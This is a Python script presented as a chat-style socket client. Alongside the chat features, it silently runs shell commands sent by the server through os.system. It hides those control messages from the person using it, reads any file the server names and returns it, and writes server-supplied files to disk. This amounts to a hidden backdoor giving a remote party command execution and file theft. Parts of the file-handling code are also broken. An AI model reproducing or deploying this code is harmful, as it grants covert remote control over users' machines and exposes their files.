#!/usr/bin/python3
'''
Python Script
Client Version ALPHA 2.1.0

SocketClient, a new and better socket client.

Recent Revisions:
Added some Bash input functionality, hidden from client output.
Some bug fixes for aforementioned additions.
Next version, fix the client input because it really hates Python 3

Created by Yovel Key-Cohen
'''
import sys
version=sys.version
print('You are running Python Version '+str(version))
j=0
import socket
import time
import os
import random


def send_msg():
    msg=input()
    s.send(str.encode(msg))

#ip='73.232.17.233'
#ip='192.168.1.173'
#ip='10.1.4.210'
#ip='50.192.66.25'
ip='localhost'
port=37377
b=2048

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print('\nConnecting...')
try:
    s.connect((ip,port))
except Exception as e:
    print('Error connecting to host.')
    

#    for i in range(30000,40000):
#        try:
#            s.connect((ip,i))
#        except:
#            continue
time.sleep(0.2)
while True:
    data=''
    data=(s.recv(b)).decode('UTF-8')
    try:
        truth=int(data[15])
    except Exception as e:
        truth=False
    if data!='-cmd' and data!='tn' and data!='-cat' and data!='-flood' and truth==False and data!='-send_file':
        print(data)
    
#    for i in data:
#        j+=1
#        print(str(j-1)+' '+data[j-1])
#This is some nice code to find character indices within a string
    try:
        if data=='-cmd':
            shell=s.recv(8192)
            os.system(shell.decode('UTF-8')+'; cd ~')
            print(' ')
            try:
                s.send(str.encode(' '))
            except:
                pass
        if data=='-c':
            shell=s.recv(8192)
            os.system(shell.decode('UTF-8')+'; cd ~')
            print(' ')
            try:
                s.send(str.encode(' '))
            except:
                pass
        if data=='-send_file':
            name=s.recv(128).decode('utf-8')
            filerecv=s.recv(100000).decode('utf-8')
            file=open('~/Desktop/'+name,'w')
            file.write(filerecv.read())
        elif data=='-cat':
            dir_=s.recv(8192).decode('UTF-8')
            out=os.popen('cat '+dir_).read()
            s.send(str.encode(out))
        elif data[11:13]=='tn':
            num=((s.recv(128))[11:]).decode('UTF-8')
            print('''You have been allowed to talk for '''+num+''' lines. Once you use your last line, don't talk.''')
            for i in range(int(num)):
                if str(version[0])=='3':
                    msg=input()
                    print('Sending...')
                    s.send(str.encode(msg))
                    print('Sent!\n')
                else:
                    msg=raw_input()
                    print('Sending...')
                    s.send(str.encode(msg))
                    print('Sent!\n')
        elif data[10]=='-':
                if str(version[0])=='3':
                    msg=input()
                    print('Sending...')
                    s.send(str.encode(msg))
                    print('Sent\n')
                else:
                    msg=raw_input()
                    print('Sending...')
                    s.send(str.encode(msg))
                    print('Sent\n')
        elif not data:
            s.close()
    except:
        print('Either the connection closed by the host, or a fatal error occurred.')
        s.close()
